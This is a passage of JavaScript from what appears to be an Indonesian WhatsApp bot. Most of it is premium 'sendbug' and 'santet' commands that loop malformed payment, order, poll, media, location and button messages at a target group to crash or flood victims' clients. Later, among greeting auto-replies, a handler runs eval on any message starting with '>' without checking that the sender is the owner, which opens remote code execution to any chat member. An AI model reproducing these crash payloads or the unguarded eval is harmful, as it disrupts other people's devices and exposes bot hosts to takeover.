contextInfo: { forwardingScore: 150, isForwarded: true },
},
},
{ quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], buginvite.message, { messageId: buginvite.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpaymentgcv':
case 'sendbugpaygcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpollinggcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var bugreact = await Araa.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: m.id } } })
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], pollCreation.message, { messageId: pollCreation.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugtroligcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], order.message, { messageId: order.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugaudiogcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], audio.message, { messageId: audio.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugimagegcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], image.message, { messageId: image.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugdocumentgcv':
case 'sendbugdocgcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], document.message, { messageId: document.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugstickergcv':
case 'sendbugstickgcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], sticker.message, { messageId: sticker.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbuglokasigcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], liveLocation.message, { messageId: liveLocation.key.id })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugkataloggcv':
case 'sendbugcataloggcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.sendKatalog(q.split("|")[0], `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugbuttongcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.sendMessage(q.split("|")[0], { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugspamgcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split("|")[0], buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(q.split("|")[0], { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(q.split("|")[0], pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(q.split("|")[0], order.message, { messageId: order.key.id })
Araa.relayMessage(q.split("|")[0], audio.message, { messageId: audio.key.id })
Araa.relayMessage(q.split("|")[0], image.message, { messageId: image.key.id })
Araa.relayMessage(q.split("|")[0], document.message, { messageId: document.key.id })
Araa.relayMessage(q.split("|")[0], liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(q.split("|")[0], sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(q.split("|")[0], `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(q.split("|")[0], { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break  
case 'sendbugsanted':
case 'sendbugsantet':
case 'santet':
case 'santed':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (mentionByReply) {
require('../lib/indexByReply.js')(Araa, m, mentionByReply, prefix, pushname, sender, isOwner, from, fake)
} else if (mentionByTag[0] && isGroup) {
require('../lib/indexByTag.js')(Araa, m, mentionByTag, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && !q.split("|")[2]) {
require('../lib/indexByNumber.js')(Araa, m, q, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && q.split("|")[1] && q.split("|")[2]) {
require('../lib/santed.js')(Araa, setReply, q, sleep)
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break
case 'sendbugsantetgc':
case 'sendbugsantedgc':
case 'santetgc':
case 'santedgc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('id gc?')
if (!isGroup && q) {                    
require('../lib/index1.js')(Araa, m, q, prefix, pushname, sender, isOwner, from, fake)
} else if (isGroup && !q) {
require('../lib/index1.js')(Araa, m, q, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && q.split("|")[1] && q.split("|")[2]) {
require('../lib/santedGc.js')(Araa, setReply, q, sleep)                                       
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break
//================================================================================\\
default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
if (mentionByReply) {
Araa.sendButMessage(from,`Command *${prefix + command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix + matches.bestMatch.target.toLowerCase()}*`,fake,[{ buttonId: `${prefix + matches.bestMatch.target.toLowerCase()} ${mentionByReply} ${args[0]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}` }, type: 1 }],setQuoted)
} else if (args[1] && args[0]) {
Araa.sendButMessage(from,`Command *${prefix + command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix + matches.bestMatch.target.toLowerCase()}*`,fake,[{ buttonId: `${prefix + matches.bestMatch.target.toLowerCase()} ${args[0]} ${args[1]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}` }, type: 1 }],setQuoted)
} else {
Araa.sendButMessage(from,`Command *${prefix + command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix + matches.bestMatch.target.toLowerCase()}*`,fake,[{ buttonId: `${prefix + matches.bestMatch.target.toLowerCase()} ${q}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}` }, type: 1 }],setQuoted)
}
}
} 
//================================================================================\\
if (isImage && autoSticker) {
try {
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (m.msg || m).mimetype || ''
if (/image/.test(mime)) {
let img = await Araa.downloadAndSaveMediaMessage(quoted)
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer)
await Araa.sendMessage(from,{ sticker: sticBuffer },{quoted: m,mimetype: 'image/webp',ephemeralExpiration: 86400,})
}
} catch (err) {}
}
//================================================================================\\
if (budy.includes('ekprefix')) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
Araa.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`, text, { quoted: setQuoted, contextInfo: forward })
}
//================================================================================\\
if (salam.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
if (isOwner) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(ucapbot)
} else if (autoSticker) {
sendSticker(ucapsalam)
} else {
setReply('Ucap salam napah')
}
}
//================================================================================\\
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(walaikumsalam)
} else if (autoSticker) {
sendSticker(kumsalam)
} else {
setReply('Walaikumsalam kak')
}
}
//================================================================================\\
if (!isOwner && bad.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(astaga)
} else if (autoSticker) {
await sendSticker(katakasar)
} else {
await setReply('Jangan Toxic Kak')
}
}
//================================================================================\\
if (!isOwner && dosa.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(sangeya)
} else if (autoSticker) {
await sendSticker(istigfar)
} else {
await setReply('Astagfirloh oni chan')
}
}
//================================================================================\\
if (katahai.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) return sendvn(moshimos)
}
//================================================================================\\
if (ohayo.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50') return setReply('Sekarang udah ga pagi kak')
if (autovn === true) return sendvn(oahyo)
setReply(`${ucapanWaktu} kak 🙂`)
}
//================================================================================\\
if (katamalem.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00') return setReply('Sekarang udah ga malem kak')
if (autovn) {
sendvn(oyasumi)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
//================================================================================\\
if (katasiang.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(koniciwa)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
//================================================================================\\
if (badud.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(ucapbot)
} else {
setReply(hayuk)
}
}
//================================================================================\\
if (katalopyou.includes(messagesC)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autovn) {
sendvn(lopyoutoo)
} else {
setReply('??')
}
}
//================================================================================\\
if (!isOwner && budy.includes(nomerOwner)) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
const kta = ['*Bentar ya kak nanti juga di bales sama ownerku* 😉', '*Tunggu aja kak, entar juga di bales* 😁', '*Iya kak, ada apa tag owner aku nih* 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
//================================================================================\\
for (let kasih of thanks) {
if (budy.includes(kasih) || selectedButton == 'Thanks') {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
if (autoSticker) return sendSticker(samasama)
setReply(`Sama sama kak ${pushname}`)
}
}
//================================================================================\\
if (!isGroup && budy.startsWith('sv')) {
if (cekSpam('NotCase', senderNumber, AntiSpam)) return
addSpam('NotCase', senderNumber, '10s', AntiSpam)
setReply('Pahami dan baca peraturan bot,\nBot tidak menerima save nomer')
}
//================================================================================\\
if (isOwner && body.startsWith('$')) {
await setReply('_Executing..._')
exec(q, async (err, stdout) => {
if (err) return setReply(`${botName}:~ ${err}`)
if (stdout) {
await setReply(`_${stdout}_`)
setReply('_Executing Finished_')
}
})
}
//================================================================================\\
if (body.startsWith('>')) {
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))
}
}
//================================================================================\\
if (isOwner && body.startsWith('=>')) {
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
if (sat) {
var bang = util.format(sat)
} else if (sat == undefined) {
var bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`(async () => { return ${q} })()`)))
} catch (e) {
setReply(String(e))
}
}
//================================================================================\\
if (isOwner && body.startsWith('+>')) {
try {
return setReply(`OutPut: 
${JSON.stringify(eval(budy.slice(2)), null, '\t')}
`)
} catch (err) {
e = String(err)
setReply(`"err" :  "${e}"`)
}
}
//================================================================================\\
if (body.startsWith(`bullyukk`)) {
setReply(`Hayuk ah`)
Araa.sendButMessage(from, `Enaknya di apain nih 🤭`, `${fake}`, [
{ buttonId: ``, buttonText: { displayText: `di ${bully1}` }, type: 1 },
{ buttonId: ``, buttonText: { displayText: `di ${bully2}` }, type: 1 },
{ buttonId: ``, buttonText: { displayText: `di ${bully3}` }, type: 1 },
])
}
//================================================================================\\
if (body.startsWith(`welcomeee`)) {
setReply(`Welcome Kak ${sender.split('@')[0]}

Jangan Lupa Intro Y

NAMA:
UMUR:
KELAS:
HOBI:
KESUKAAN:
JENIS KELAMIN:
GOLONGAN DARAH:
NAMA IBU:
NAMA BAPAK:
NAMA KAKEK:
NAMA NENEK:
NAMA BUYUT PEREMPUAN:
NAMA BUYUT LAKI LAKI:
NAMA SAUDARA PEREMPUAN:
NAMA SAUDARA LAKI LAKI:
NAMA SEPUPU PEREMPUAN:
NAMA SEPUPU LAKI LAKI:
NAMA KAKAK:
NAMA ADEK:
